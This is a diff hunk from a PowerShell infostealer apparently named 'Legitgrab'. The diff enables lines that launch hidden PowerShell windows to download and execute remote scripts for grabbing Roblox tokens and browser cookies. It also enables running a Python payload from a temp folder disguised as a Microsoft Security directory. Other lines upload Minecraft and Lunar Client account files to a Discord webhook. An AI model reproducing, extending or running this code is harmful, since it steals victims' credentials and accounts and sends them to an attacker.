@@ -106,12 +106,12 @@ powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://
 powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID_gen.ps1).content)
 #For grab roblox info/tokens
 
-#powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID_use.ps1).content)
+powershell -windowstyle hidden $webHookUrl2=$webHookUrl;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID_use.ps1).content)
 #For grab all cookies (thx to https://github.com/Smug246/Luna-Token-Grabber)
-#NOT IMPLEMENTED
 
 #powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID_utils.ps1).content)
 #For idk lol
+#Soon ?
 
 ######################################################################
 
@@ -127,7 +127,7 @@ Start-Sleep -Seconds 2
 Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
 Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
 Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
-#powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID_use.py
+powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID_use.py
 #powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID_utils.py
 
 ######################################################################
